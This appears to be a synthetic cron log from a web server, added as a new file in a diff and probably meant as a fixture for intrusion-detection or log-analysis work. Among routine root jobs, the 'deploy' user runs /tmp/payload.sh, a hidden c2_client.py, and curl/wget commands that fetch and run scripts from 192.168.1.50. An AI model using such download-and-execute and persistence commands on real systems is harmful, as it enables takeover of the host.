@@ -1,0 +1,16 @@
+Jan 15 01:00:01 webserver01 CRON[10001]: (root) CMD (/usr/lib/apt/apt.systemd.daily)
+Jan 15 02:00:00 webserver01 CRON[10050]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+Jan 15 04:30:00 webserver01 CRON[10100]: (deploy) CMD (/tmp/payload.sh)
+Jan 15 04:31:00 webserver01 CRON[10101]: (deploy) CMD (curl http://192.168.1.50:8080/beacon.sh | bash)
+Jan 15 04:32:00 webserver01 CRON[10102]: (deploy) CMD (python3 /tmp/.hidden/c2_client.py)
+Jan 15 04:33:00 webserver01 crontab[10103]: (deploy) REPLACE
+Jan 15 05:00:00 webserver01 CRON[10200]: (root) CMD (/usr/lib/apt/apt.systemd.daily install)
+Jan 15 05:30:00 webserver01 CRON[10201]: (deploy) CMD (/tmp/payload.sh)
+Jan 15 06:00:00 webserver01 CRON[10300]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
+Jan 15 06:30:00 webserver01 CRON[10301]: (deploy) CMD (/tmp/payload.sh)
+Jan 15 07:00:00 webserver01 CRON[10400]: (root) CMD (/usr/bin/freshclam --quiet)
+Jan 15 07:30:00 webserver01 CRON[10401]: (deploy) CMD (wget -q http://192.168.1.50/update.sh -O /tmp/.update.sh && bash /tmp/.update.sh)
+Jan 15 08:00:00 webserver01 CRON[10500]: (sysadmin) CMD (/usr/local/bin/backup.sh)
+Jan 15 08:30:00 webserver01 crontab[10501]: (sysadmin) LIST
+Jan 15 09:00:00 webserver01 CRON[10600]: (root) CMD (/usr/bin/certbot renew --quiet)
+Jan 15 12:00:00 webserver01 CRON[10700]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
